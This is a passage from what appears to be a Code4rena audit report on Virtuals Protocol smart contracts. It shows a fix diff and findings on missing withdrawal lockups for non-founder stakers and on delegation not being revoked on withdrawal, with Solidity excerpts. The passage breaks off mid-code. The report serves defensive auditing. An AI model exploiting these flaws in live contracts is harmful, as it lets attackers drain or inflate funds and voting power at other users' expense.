}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Calculate total distribution amount\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 totalDistributionAmount = 0;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        for (uint256 i = 0; i \u0026lt; distributeAgentTokenUserAmounts.length; i++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            totalDistributionAmount += distributeAgentTokenUserAmounts[i];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Check if contract has enough agent token balance only after agentTokenAddress be set\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            IERC20(agentTokenAddress).balanceOf(address(this)) \u0026gt;= totalDistributionAmount,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u0026quot;Insufficient Agent Token balance\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Directly transfer Virtual Token refunds\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        for (uint256 i = 0; i \u0026lt; refundVirtualsTokenUserAddresses.length; i++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            // first decrease the virtuals mapping of the user to prevent reentrancy attacks\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            mapAddrToVirtuals[refundVirtualsTokenUserAddresses[i]] -= refundVirtualsTokenUserAmounts[i];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            // then transfer the virtuals\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            IERC20(virtualTokenAddress).safeTransfer(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                refundVirtualsTokenUserAddresses[i],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                refundVirtualsTokenUserAmounts[i]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            emit RefundClaimed(genesisId, refundVirtualsTokenUserAddresses[i], refundVirtualsTokenUserAmounts[i]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // save the amount of agent tokens to claim\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        for (uint256 i = 0; i \u0026lt; distributeAgentTokenUserAddresses.length; i++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-            claimableAgentTokens[distributeAgentTokenUserAddresses[i]] = distributeAgentTokenUserAmounts[i];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+            claimableAgentTokens[distributeAgentTokenUserAddresses[i]] += distributeAgentTokenUserAmounts[i]; \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        emit GenesisSucceeded(genesisId);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        return agentTokenAddress;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-19-lack-of-maturity-check-for-non-founder-users-allowing-immediate-withdrawals\" style=\"position:relative;\"\u003e\u003ca href=\"#m-19-lack-of-maturity-check-for-non-founder-users-allowing-immediate-withdrawals\" aria-label=\"m 19 lack of maturity check for non founder users allowing immediate withdrawals permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-128\"\u003e[M-19] Lack of maturity check for non-founder users allowing immediate withdrawals\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-700\"\u003ePelz\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-847\"\u003eaiota\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-393\"\u003egregom\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-149\"\u003eIshenxx\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L95\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L95\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-6\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-6\" aria-label=\"finding description and impact 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eIn the \u003ccode\u003eAgentVeToken::withdraw()\u003c/code\u003e function, the contract contains a check for the maturity of stakes, but this check only applies to the founding staker (\u003ccode\u003efounder\u003c/code\u003e). The condition is:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"102\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efounder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; ((\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialLock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematureAt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Not mature yet\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis ensures that the founding staker must wait for a lockup period before withdrawing if their balance falls below \u003ccode\u003einitialLock\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eHowever, there is no such lockup or maturity check for non-founder users. If \u003ccode\u003ecanStake\u003c/code\u003e is enabled for all users, any user who stakes tokens can withdraw immediately, bypassing any intended lockup or maturity period. This flaw effectively removes any staking or lockup incentive for users who stake their tokens, as they can withdraw at will without any restriction.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eTo address this issue, a maturity check should be applied to all users who stake tokens. This would ensure that all users are subject to the same withdrawal restrictions, and their stakes are locked for a specified period before they can withdraw. Recommended approach:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eImplement the lockup for non-founder users:\u003c/strong\u003e Ensure that all users, not just the founder, are locked in for a set period before being allowed to withdraw. You could add logic to set a different lockup period for different classes of users if needed.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-20-delegation-not-revoked-on-withdrawal-allows-reward-and-voting-power-inflation-post-maturity\" style=\"position:relative;\"\u003e\u003ca href=\"#m-20-delegation-not-revoked-on-withdrawal-allows-reward-and-voting-power-inflation-post-maturity\" aria-label=\"m 20 delegation not revoked on withdrawal allows reward and voting power inflation post maturity permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-129\"\u003e[M-20] Delegation not revoked on withdrawal allows reward and voting power inflation post-maturity\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-456\"\u003eyaractf\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-148\"\u003eIshenxx\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-399\"\u003ennamdi0482\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L102\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L102\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV3.sol#L264\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV3.sol#L264\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-7\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-7\" aria-label=\"finding description and impact 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eStakers delegate their voting power using the \u003ccode\u003estake()\u003c/code\u003e function, which internally calls \u003ccode\u003e_delegate(receiver, delegatee)\u003c/code\u003e and records the delegatee via checkpointing at the current \u003ccode\u003eclock()\u003c/code\u003e (block number). Upon maturity (\u003ccode\u003ematureAt\u003c/code\u003e), the \u003ccode\u003ewithdraw()\u003c/code\u003e function allows full withdrawal of tokens, including by the stakers.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L80\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L80\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"103\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecanStake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Staking is disabled for private agent\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Either public or first staker\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Cannot stake 0\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient asset token balance\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eallowance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient asset token allowance\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estakingTokenToVirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisBlacklisted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Agent Blacklisted\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == 